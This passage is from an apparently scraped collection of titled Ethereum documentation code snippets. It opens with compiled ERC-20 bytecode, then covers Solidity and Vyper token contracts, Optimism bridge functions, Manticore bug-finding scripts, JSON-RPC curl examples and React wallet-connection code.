d5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Logging in a Counter Smart Contract\nDESCRIPTION: A complete Counter contract example that demonstrates how to declare, emit, and use events to log data changes. The contract emits a ValueChanged event whenever the counter is incremented.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.5.17;\n\ncontract Counter {\n\n    event ValueChanged(uint oldValue, uint256 newValue);\n\n    // Private variable of type unsigned int to keep the number of counts\n    uint256 private count = 0;\n\n    // Function that increments our counter\n    function increment() public {\n        count += 1;\n        emit ValueChanged(count - 1, count);\n    }\n\n    // Getter to get the count value\n    function getCount() public view returns (uint256) {\n        return count;\n    }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Approval or Ownership Status in Solidity\nDESCRIPTION: Internal view function that checks if an address is either the owner or approved to manage a specific pizza token. Used for authorization before token transfers and other operations.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n    internal\n    view\n    returns (bool)\n{\n    address owner = pizzaToOwner[pizzaId];\n    // Disable solium check because of\n    // https://github.com/duaraghav8/Solium/issues/175\n    // solium-disable-next-line operator-whitespace\n    return (spender == owner ||\n        this.getApproved(pizzaId) == spender ||\n        this.isApprovedForAll(owner, spender));\n}\n```\n\n----------------------------------------\n\nTITLE: Defining l2TokenBridge Getter Function for L1 Bridge\nDESCRIPTION: Function to get the address of the corresponding L2 bridge contract. This function exists for symmetry with the L2 bridge, as the L2 bridge is always at a fixed predeployed address (0x4200000000000000000000000000000000000010).\n\nLANGUAGE: solidity\nCODE:\n```\n    /********************\n     * Public Functions *\n     ********************/\n\n    /**\n     * @dev get the address of the corresponding L2 bridge contract.\n     * @return Address of the corresponding L2 bridge contract.\n     */\n    function l2TokenBridge() external returns (address);\n```\n\n----------------------------------------\n\nTITLE: Emitting ETH Withdrawal Event in Optimism Bridge\nDESCRIPTION: This code emits an event when an ETH withdrawal is finalized on L1, notifying listeners that the withdrawal process is complete.\n\nLANGUAGE: solidity\nCODE:\n```\nemit ETHWithdrawalFinalized(_from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: Calculating Dynamic Block Limits in Ethereum\nDESCRIPTION: This code snippet demonstrates how Ethereum dynamically adjusts block operation limits based on previous blocks. It uses an exponential moving average approach to prevent sudden dramatic changes while allowing the network to adapt to demand over time.\n\nLANGUAGE: javascript\nCODE:\n```\nblk.oplimit = floor((blk.parent.oplimit * (EMAFACTOR - 1) +\nfloor(parent.opcount * BLK\\_LIMIT\\_FACTOR)) / EMA_FACTOR)\n```\n\n----------------------------------------\n\nTITLE: Implementing NFT Burning Function in Vyper\nDESCRIPTION: This function allows token owners or approved addresses to burn (destroy) tokens. It validates authorization, ensures the token exists, clears any approvals, removes the token from the owner's collection, and emits a Transfer event to the zero address.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Completing ERC20 Approve Function Implementation in Solidity\nDESCRIPTION: This code completes the approve function by calling the internal _approve function that handles the actual state changes. It uses _msgSender() for OpenGSN compatibility and returns true on success.\n\nLANGUAGE: solidity\nCODE:\n```\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n```\n\n----------------------------------------\n\nTITLE: Creating and Deploying a Contract with Manticore API\nDESCRIPTION: Python code to define a Solidity contract as a string and deploy it to the Manticore EVM using the API. The contract is owned by a previously created user account.\n\nLANGUAGE: python\nCODE:\n```\nsource_code = '''\npragma solidity >=0.4.24 <0.6.0;\ncontract Simple {\n    function f(uint a) payable public{\n        if (a == 65) {\n            revert();\n        }\n    }\n}\n'''\n# Initiate the contract\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n```\n\n----------------------------------------\n\nTITLE: Initializing Component State using useEffect Hook\nDESCRIPTION: This useEffect hook initializes the component state by loading the current message from the smart contract and checking for connected wallets. It sets up the necessary event listeners for wallet and contract state changes.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n  addSmartContractListener()\n\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Interface NatSpec Documentation\nDESCRIPTION: This NatSpec comment provides documentation for the ERC-20 interface. The @dev tag indicates this comment is for developers and explains that this interface follows the ERC-20 standard as defined in the EIP.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\n```\n\n----------------------------------------\n\nTITLE: Validating Addresses in ERC-20 Transfer Function\nDESCRIPTION: Check for zero address in both sender and recipient to prevent accidental token loss. Zero address validation is a common security measure in token transfers.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(sender != address(0), \"ERC20: transfer from the zero address\");\nrequire(recipient != address(0), \"ERC20: transfer to the zero address\");\n```\n\n----------------------------------------\n\nTITLE: Detecting REVERT/INVALID States in Ethereum Smart Contracts using Manticore\nDESCRIPTION: This code iterates through terminated states in a Manticore instance to identify execution paths that end with REVERT or INVALID operations. It generates a test case when a bug is found under specific conditions (when symbolic_var is not equal to 65) and outputs the result location or indicates no bugs were found.\n\nLANGUAGE: python\nCODE:\n```\nfor state in m.terminated_states:\n    last_tx = state.platform.transactions[-1]\n    if last_tx.result in ['REVERT', 'INVALID']:\n        # we do not consider the path were a == 65\n        condition = symbolic_var != 65\n        if m.generate_testcase(state, name=\"BugFound\", only_if=condition):\n            print(f'Bug found, results are in {m.workspace}')\n            no_bug_found = False\n\nif no_bug_found:\n    print(f'No bug found')\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Interface NatSpec Documentation\nDESCRIPTION: This NatSpec comment provides documentation for the ERC-20 interface. The @dev tag indicates this comment is for developers and explains that this interface follows the ERC-20 standard as defined in the EIP.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\n```\n\n----------------------------------------\n\nTITLE: Running Transaction Script with Node.js\nDESCRIPTION: Command for executing the transaction script using Node.js. This command runs the sendTx.js file to initiate the Ethereum transaction.\n\nLANGUAGE: bash\nCODE:\n```\nnode sendTx.js\n```\n\n----------------------------------------\n\nTITLE: Accessing Mapping Value with eth_getStorageAt\nDESCRIPTION: A cURL request example demonstrating how to retrieve a value from a mapping in a smart contract's storage. The request uses the previously calculated storage hash to access the specific position where the mapping value is stored.\n\nLANGUAGE: javascript\nCODE:\n```\ncurl -X POST --data '{\"jsonrpc\":\"2.0\", \"method\": \"eth_getStorageAt\", \"params\": [\"0x295a70b2de5e3953354a6a8344e616ed314d7251\", \"0x6661e9d6d8b923d5bbaab1b96e1dd51ff6ea2a93520fdc9eb75d059238b8c5e9\", \"latest\"], \"id\": 1}' localhost:8545\n{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":\"0x000000000000000000000000000000000000000000000000000000000000162e\"}\n```\n\n----------------------------------------\n\nTITLE: Implementing WORM Contract with Cache Inheritance in Solidity\nDESCRIPTION: Implementation of a Write Once, Read Many (WORM) contract that inherits from the Cache contract. Shows how to extend the base caching functionality for specific use cases.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"./Cache.sol\";\n\ncontract WORM is Cache {\n```\n\n----------------------------------------\n\nTITLE: Storing Token Addresses for a Pair\nDESCRIPTION: Declares public variables to store the addresses of the two ERC-20 token contracts that can be exchanged in this pool.\n\nLANGUAGE: solidity\nCODE:\n```\naddress public token0;\naddress public token1;\n```\n\n----------------------------------------\n\nTITLE: Uniqueness Verification Modifier in Solidity\nDESCRIPTION: A modifier that ensures a pizza token is unique by checking that no existing token has the same name and DNA combination. Used to prevent duplicate tokens during creation.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Multiple Parameters from Calldata in Solidity\nDESCRIPTION: Iteratively reads a specified number of parameters from calldata starting at the function signature offset (byte 4).\n\nLANGUAGE: solidity\nCODE:\n```\n// Read n parameters (functions know how many parameters they expect)\nfunction _readParams(uint _paramNum) internal returns (uint[] memory) {\n    // The parameters we read\n    uint[] memory params = new uint[](_paramNum);\n\n    // Parameters start at byte 4, before that it's the function signature\n    uint _atByte = 4;\n\n    for(uint i=0; i<_paramNum; i++) {\n        (_atByte, params[i]) = _readParam(_atByte);\n    }\n\n    return(params);\n}   // readParams\n\n// For testing _readParams, test reading four parameters\nfunction fourParam() public\n    returns (uint256,uint256,uint256,uint256)\n{\n    uint[] memory params;\n    params = _readParams(4);\n    return (params[0], params[1], params[2], params[3]);\n}    // fourParam\n```\n\n----------------------------------------\n\nTITLE: ERC-20 balanceOf Function Definition\nDESCRIPTION: Defines the balanceOf function that returns the token balance of a specific account. Takes an address parameter and returns a uint256 value.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: ETH Deposit Functions\nDESCRIPTION: Implements the standard ETH deposit functions that allow users to deposit ETH to L2. These functions act as wrappers around the internal _initiateETHDeposit function, with options to deposit to the sender's address or a specified recipient address.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETH(uint32 _l2Gas, bytes calldata _data) external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, _l2Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL1StandardBridge\n     */\n    function depositETHTo(\n        address _to,\n        uint32 _l2Gas,\n        bytes calldata _data\n    ) external payable {\n        _initiateETHDeposit(msg.sender, _to, _l2Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Adding Constraints to Manticore Analysis\nDESCRIPTION: Example showing how to add constraints to the exploration using the Z3Solver, which can help focus the analysis on specific execution paths or exclude known edge cases.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\nfrom manticore.core.smtlib.solver import Z3Solver\n\nsolver = Z3Solver.instance()\n\nm = ManticoreEVM()\n\nwith open(\"example.sol\") as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nno_bug_found = True\n```\n\n----------------------------------------\n\nTITLE: ERC-1155 Batch Approval Functions\nDESCRIPTION: Documents the ERC-1155 approval mechanism, which uses an all-or-nothing approach through the setApprovalForAll function. This differs from ERC-20's specific amount approvals by granting an operator permission to manage all of an owner's tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n// ERC-1155\nfunction setApprovalForAll(\n    address _operator,\n    bool _approved\n) external;\n\nfunction isApprovedForAll(\n    address _owner,\n    address _operator\n) external view returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Initiating ERC20 Token Deposit from L1 to L2 in Solidity\nDESCRIPTION: This internal function handles the process of depositing ERC20 tokens from L1 to L2. It transfers tokens from the sender to the bridge contract, constructs a message to finalize the deposit on L2, and updates the deposit tracking data structure.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _initiateERC20Deposit(\n    address _l1Token,\n    address _l2Token,\n    address _from,\n    address _to,\n    uint256 _amount,\n    uint32 _l2Gas,\n    bytes calldata _data\n) internal {\n    // When a deposit is initiated on L1, the L1 Bridge transfers the funds to itself for future\n    // withdrawals. safeTransferFrom also checks if the contract has code, so this will fail if\n    // _from is an EOA or address(0).\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);\n\n    // Construct calldata for _l2Token.finalizeDeposit(_to, _amount)\n    bytes memory message = abi.encodeWithSelector(\n        IL2ERC20Bridge.finalizeDeposit.selector,\n        _l1Token,\n        _l2Token,\n        _from,\n        _to,\n        _amount,\n        _data\n    );\n\n    // Send calldata into L2\n    // slither-disable-next-line reentrancy-events, reentrancy-benign\n    sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n    // slither-disable-next-line reentrancy-benign\n    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;\n\n    // slither-disable-next-line reentrancy-events\n    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount, _data);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Smart Contract Event Listener in React\nDESCRIPTION: A JavaScript function that listens for the UpdatedMessages event from the HelloWorld contract and updates the UI accordingly. It handles both successful message updates and errors.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nfunction addSmartContractListener() {\n  helloWorldContract.events.UpdatedMessages({}, (error, data) => {\n    if (error) {\n      setStatus(\"😥 \" + error.message)\n    } else {\n      setMessage(data.returnValues[1])\n      setNewMessage(\"\")\n      setStatus(\"🎉 Your message has been updated!\")\n    }\n  })\n}\n```\n\n----------------------------------------\n\nTITLE: Writing a Deployment Script for Ethereum Smart Contract\nDESCRIPTION: A JavaScript script using ethers.js to deploy the HelloWorld smart contract to Ethereum. The script creates a contract factory, deploys the contract with an initial message, and logs the contract's address after deployment.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const HelloWorld = await ethers.getContractFactory(\"HelloWorld\")\n\n  // Start deployment, returning a promise that resolves to a contract object\n  const hello_world = await HelloWorld.deploy(\"Hello World!\")\n  console.log(\"Contract deployed to address:\", hello_world.address)\n}\n\nmain()\n  .then(() => process.exit(0))\n  .catch((error) => {\n    console.error(error)\n    process.exit(1)\n  })\n```\n\n----------------------------------------\n\nTITLE: Vérification des adresses de destination avec Solidity et Yul\nDESCRIPTION: Ce code vérifie que l'adresse de destination n'est pas l'adresse du contrat lui-même et qu'elle n'est pas une adresse vide en utilisant une combinaison de Solidity et Yul pour l'efficacité.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(to != address(this), \"Can't send tokens to the contract address\");\n\nbool isToContract;\nassembly {\n   isToContract := gt(extcodesize(to), 0)\n}\n\nrequire(to.balance != 0 || isToContract, \"Can't send tokens to an empty address\");\n```\n\n----------------------------------------\n\nTITLE: Creating a Frozen Accounts Mapping in Solidity\nDESCRIPTION: A mapping that tracks which addresses are frozen. By default, all boolean values are initialized to false, meaning accounts are not frozen initially.\n\nLANGUAGE: solidity\nCODE:\n```\nmapping(address => bool) public frozenAccounts;\n```\n\n----------------------------------------\n\nTITLE: Implementing MetaMask Wallet Connection in JavaScript\nDESCRIPTION: This function handles connecting to the MetaMask wallet. It checks if MetaMask is installed, requests the user's account, and returns the connected address or appropriate error messages for different scenarios.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Approval Events for Suspicious Behavior\nDESCRIPTION: Implements the core logic for determining if an Approval event is suspicious based on ownership and transaction origin criteria. Returns the event if suspicious, null otherwise.\n\nLANGUAGE: typescript\nCODE:\n```\nconst suspiciousApprovalEvent = async (ev : Event) : (Event | null) => {\n  const owner = ev.args._owner\n\n  // Approvals by contracts are not suspicious\n  if (await isContract(owner)) return null\n\n  const txn = await getEventTxn(ev)\n\n  // The approval is suspicious if it comes an EOA owner that isn't the transaction's `from`\n  if (owner.toLowerCase() != txn.from.toLowerCase()) return ev\n\n  // It is also suspicious if the transaction destination isn't the ERC-20 contract we are\n  // investigating\n  if (txn.to.toLowerCase() != testedAddress) return ev\n\n    // If there is no reason to be suspicious, return null.\n    return null\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Token Ownership or Approval in Solidity\nDESCRIPTION: An internal view function that checks if an address is the owner or has approval to transfer a specific Pizza token. Returns boolean based on three conditions: direct ownership, token approval, or operator approval.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n    internal\n    view\n    returns (bool)\n{\n    address owner = pizzaToOwner[pizzaId];\n    // Disable solium check because of\n    // https://github.com/duaraghav8/Solium/issues/175\n    // solium-disable-next-line operator-whitespace\n    return (spender == owner ||\n        this.getApproved(pizzaId) == spender ||\n        this.isApprovedForAll(owner, spender));\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Contract ABI from Hardhat Artifacts in JavaScript\nDESCRIPTION: Imports the contract ABI from the Hardhat artifacts directory which is necessary for interacting with the deployed smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n```\n\n----------------------------------------\n\nTITLE: Taking Ownership of Pizza NFT in Solidity\nDESCRIPTION: Function to take ownership of a Pizza NFT, requiring that the caller is either approved or the owner. Gets the current owner and transfers the NFT to the caller.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction takeOwnership(uint256 _pizzaId) public {\n    require(_isApprovedOrOwner(msg.sender, _pizzaId), \"Address is not approved.\");\n    address owner = this.ownerOf(_pizzaId);\n    this.transferFrom(owner, msg.sender, _pizzaId);\n}\n```\n\n----------------------------------------\n\nTITLE: Minting Token and Emitting Transfer Event in ERC-721 Contract\nDESCRIPTION: This code mints a new token to the specified address by adding it to their collection and emits a Transfer event from the zero address to indicate a new token creation.\n\nLANGUAGE: vyper\nCODE:\n```\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n```\n\n----------------------------------------\n\nTITLE: Scrypt Test Vector for Web3 Keystore v3\nDESCRIPTION: A complete test vector example for a Web3 keystore v3 file using AES-128-CTR and Scrypt for key derivation. Includes the JSON file content and intermediate computation results for validation.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-ctr\",\n    \"cipherparams\": {\n      \"iv\": \"740770fce12ce862af21264dab25f1da\"\n    },\n    \"ciphertext\": \"dd8a1132cf57db67c038c6763afe2cbe6ea1949a86abc5843f8ca656ebbb1ea2\",\n    \"kdf\": \"scrypt\",\n    \"kdfparams\": {\n      \"dklen\": 32,\n      \"n\": 262144,\n      \"p\": 1,\n      \"r\": 8,\n      \"salt\": \"25710c2ccd7c610b24d068af83b959b7a0e5f40641f0c82daeb1345766191034\"\n    },\n    \"mac\": \"337aeb86505d2d0bb620effe57f18381377d67d76dac1090626aa5cd20886a7c\"\n  },\n  \"id\": \"3198bc9c-6672-5ab3-d995-4942343ae5b6\",\n  \"version\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Wallet Connection in React Component\nDESCRIPTION: Code for initializing the Minter React component with state variables for wallet address, status messages, and NFT metadata. This code shows the import structure and state setup necessary for the wallet connection implementation.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { useEffect, useState } from \"react\";\nimport { connectWallet } from \"./utils/interact.js\";\n\nconst Minter = (props) => {\n\n  //State variables\n  const [walletAddress, setWallet] = useState(\"\");\n  const [status, setStatus] = useState(\"\");\n  const [name, setName] = useState(\"\");\n  const [description, setDescription] = useState(\"\");\n  const [url, setURL] = useState(\"\");\n```\n\n----------------------------------------\n\nTITLE: L1 Standard Bridge Contract Definition\nDESCRIPTION: Defines the main L1 Standard Bridge contract that implements the IL1StandardBridge interface and extends CrossDomainEnabled for cross-layer messaging. It uses SafeERC20 for all IERC20 interactions.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @title L1StandardBridge\n * @dev The L1 ETH and ERC20 Bridge is a contract which stores deposited L1 funds and standard\n * tokens that are in use on L2. It synchronizes a corresponding L2 Bridge, informing it of deposits\n * and listening to it for newly finalized withdrawals.\n *\n */\ncontract L1StandardBridge is IL1StandardBridge, CrossDomainEnabled {\n    using SafeERC20 for IERC20;\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transaction in Manticore for Ethereum\nDESCRIPTION: Code snippet showing how to execute a raw transaction using Manticore's transaction method, which can take concrete or symbolic parameters for caller, address, data, and value.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\n----------------------------------------\n\nTITLE: Implementing Hello World Smart Contract in Solidity\nDESCRIPTION: A simple Hello World smart contract that stores a message and allows updating it. It includes a constructor that initializes the message and an update function to change it later.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifica la versione di Solidity, utilizzando il controllo delle versioni semantico.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// Un contratto è una raccolta di funzioni e dati (il suo stato). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // Le variabili di stato sono variabili con valori memorizzati in modo permanente nello spazio di archiviazione (storage) del contratto. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // I costruttori sono utilizzati per inizializzare i dati del contratto. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Sending Transaction to Smart Contract using JSON-RPC via curl\nDESCRIPTION: Example of using curl to send a JSON-RPC request to call a smart contract's multiply function with an argument of 6. The request includes the from address, contract address, and properly encoded function data.\n\nLANGUAGE: bash\nCODE:\n```\ncurl --data '{\"jsonrpc\":\"2.0\",\"method\": \"eth_sendTransaction\", \"params\": [{\"from\": \"0xeb85a5557e5bdc18ee1934a89d8bb402398ee26a\", \"to\": \"0x6ff93b4b46b41c0c3c9baee01c255d3b4675963d\", \"data\": \"0xc6888fa10000000000000000000000000000000000000000000000000000000000000006\"}], \"id\": 8}' -H \"Content-Type: application/json\" localhost:8545\n{\"id\":8,\"jsonrpc\":\"2.0\",\"result\":\"0x759cf065cbc22e9d779748dc53763854e5376eea07409e590c990eafc0869d74\"}\n```\n\n----------------------------------------\n\nTITLE: Creating an ERC-721 NFT Smart Contract in Solidity\nDESCRIPTION: This contract implements an ERC-721 NFT standard using OpenZeppelin libraries. It includes functionality for minting NFTs with unique token IDs and custom metadata URIs. The contract is owned by the deployer who has exclusive 